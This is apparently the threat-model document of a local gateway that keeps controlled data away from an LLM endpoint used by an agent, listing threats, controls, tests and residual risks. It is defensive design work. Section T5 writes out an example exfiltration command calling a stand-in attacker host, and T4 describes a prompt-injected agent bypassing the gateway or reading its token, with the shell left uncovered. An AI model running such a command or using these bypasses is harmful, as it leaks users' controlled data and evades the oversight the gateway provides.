# Threat model

cui-guard is a local gateway between an agent and an LLM endpoint. It is a mistake-reducer, not a guarantee. This document lists what it protects, who it defends against, which controls apply, which tests pin them, and what remains. Residual risks are cited from [LIMITS.md](LIMITS.md), which stays the authority for them.

## Assets

- The user's controlled data in prompts and tool results.
- Upstream credentials.
- The per-session gateway token.
- The session map (placeholder to real value).
- The audit log.
- Policy files.
- The integrity of the published package.

## Out of scope

- A malicious process running as the same user, and administrators. See "Same-user processes are not contained" in [LIMITS.md](LIMITS.md).
- Deciding whether any use of an LLM is permitted for your data.

## T1 Supply chain

A compromised dependency, build tool or GitHub Action; a PyPI account takeover; a typosquat of `cui-guard`.

Controls:
- One hash-locked environment (`uv.lock`, exported to `requirements/*.lock.txt`), three runtime dependencies, and a 7-day cooldown before adopting new releases.
- `pip-audit` over the locked set, with dismissals only in `security/vex.cdx.json`, each with a justification and a review-by date at most 90 days out (`scripts/security/vex.py`).
- A CycloneDX SBOM (`scripts/security/sbom.py`) embedded in the wheel.
- A reproducible-build gate (`scripts/check build`): two builds, identical digests.
- Trusted Publishing, with provenance and SBOM attestations (see T7).

Tests: `tests/security/test_lock.py`, `tests/security/test_vex.py`, `tests/security/test_sbom.py`, `tests/security/test_build.py`, `tests/security/test_report.py`, `tests/security/test_sast_config.py`.

Residual risk: a malicious release older than the cooldown window, or a vulnerability nobody has published yet, is not caught. Interpreter and OpenSSL flaws are outside the dependency audit.

## T2 Detection evasion

Content (accidental, from a repo or ticket, or prompt-injected) shaped to slip past the detectors.

Controls: Unicode normalization before detection, JSON escape handling, and fail-closed handling of unparseable input. The red-team corpus crosses obfuscations with canary types and the wire formats; the fuzz suite checks that every string leaf is scanned.

Tests: `tests/redteam/test_evasion.py` (outcomes pinned by `EXPECTED` in `tests/redteam/transforms.py`), `tests/fuzz/test_adapters_fuzz.py`, `tests/fuzz/test_mapper_fuzz.py`, `tests/fuzz/test_stream_fuzz.py`.

Residual risk: the known evasion gaps. They are pinned as strict expected failures, listed in [LIMITS.md](LIMITS.md) under "Known evasion gaps" and in [SECURITY-ASSURANCE.md](SECURITY-ASSURANCE.md). Detection is heuristic in both directions.

## T3 Browser and network

A web page reaching the loopback gateway by DNS rebinding or a cross-origin request; cleartext upstream links.

Controls: the gateway binds to 127.0.0.1 only, checks the `Host` header, rejects browser `Origin` and cross-site `Sec-Fetch-*` requests, and refuses cleartext non-loopback endpoints. Every request needs the per-session token.

Tests: `tests/pentest/test_http_surface.py`.

Residual risk: none specific beyond the same-user case above.

## T4 Prompt-injected agent

An agent that is tricked into loosening policy, reading the token, or bypassing the base URL.

Controls: loosening the policy needs OS authentication raised by the gateway; the launcher adds deny rules for the config and state directories; the token is passed through the environment only and never written to disk; state files are mode 0600 and directories 0700.

Tests: `tests/pentest/test_http_surface.py`, `tests/leak/test_tamper.py`, `tests/launch/test_claude.py` (pins the deny rules).

Residual risk: Claude deny rules cover file-editing tools, not the shell; in passthrough mode the agent can reach the provider by a route that skips the gateway. See "Approvals, overrides and the local user" and "Credentials and the agent" in [LIMITS.md](LIMITS.md).

## T5 Hostile model response

A response crafted to make rehydration put real values into a tool call that sends them out, for example `curl https://attacker/?q=<placeholder>`.

Controls: egress-aware rehydration (`src/cui_guard/pseudo/egress.py`). If any string of a tool call names a destination outside the user's network, every placeholder in that call is left as a placeholder, and a count-only `rehydrate.withheld` audit record is written. Internal means loopback, a placeholder known to this session, or a host or IP under the identifier `domains` and `ip_ranges` the user or organization configured. The detector's built-in `mil`/`gov` domains and private IP ranges grant no trust, so a hijacked model cannot send real values to another agency's `.gov` form or to a private IP address that is not configured. Bare local hostnames such as `printer.local` or `nas.lan` are not recognized as destinations (see the bare-host residual in `docs/LIMITS.md`), so a call that names only such a host still gets real values. Placeholder floods, invalid UTF-8, oversized and truncated streams, and mismatched tool-call IDs must neither crash the gateway nor leak data.

Tests: `tests/pseudo/test_egress.py`, `tests/pentest/test_hostile_upstream.py`.

Residual risk: bare hosts with unlisted TLDs, hosts assembled in the shell, and exfiltration with no visible host. See "Tool calls that name an outside host keep their placeholders" and its residual list in [LIMITS.md](LIMITS.md).

## T6 Side channels

Real values in logs, tracebacks, the audit log, error bodies, forwarded headers, URLs or temporary files.

Controls: the egress oracle records every outbound byte of a fake upstream (body, path, query, headers) and asserts that canaries never appear, on every route and every error path. A subprocess hook records every DNS lookup and socket connect and asserts the only destination is the configured upstream. The audit log and the security report hold rule IDs, counts and hashes, never matched values. Hop-by-hop headers and the guard token are never forwarded; redirects are never followed.

Tests: `tests/leak/test_egress_oracle.py`, `tests/leak/test_leak.py`, `tests/leak/test_tamper.py`, `tests/pentest/test_http_surface.py`.

Residual risk: agent transcripts on disk, justification text typed by a person, and opaque images on approved and local lanes. See "Data on disk" and "Detection quirks" in [LIMITS.md](LIMITS.md).

## T7 CI and release compromise

Workflow injection, pwn-request, token theft, cache poisoning.

Controls:
- Every action is pinned by a 40-hex commit SHA.
- Top-level `permissions: {}`, with each job granting only what it needs.
- `persist-credentials: false` on every checkout.
- No `pull_request_target`; no `${{ }}` inside `run:`; no caches in `release.yml`.
- zizmor gates the workflows (`.github/zizmor.yml`); Dependabot updates actions and dependencies behind a cooldown (`.github/dependabot.yml`).
- `release.yml` publishes through PyPI Trusted Publishing from a protected `release` environment, with no long-lived tokens.

Tests: `tests/security/test_workflows.py`.

Residual risk: repository-side controls (2FA, rulesets, required reviewers) depend on the maintainer applying [MAINTAINER-SECURITY.md](MAINTAINER-SECURITY.md). A reusable-workflow build for a higher SLSA build level is deferred.
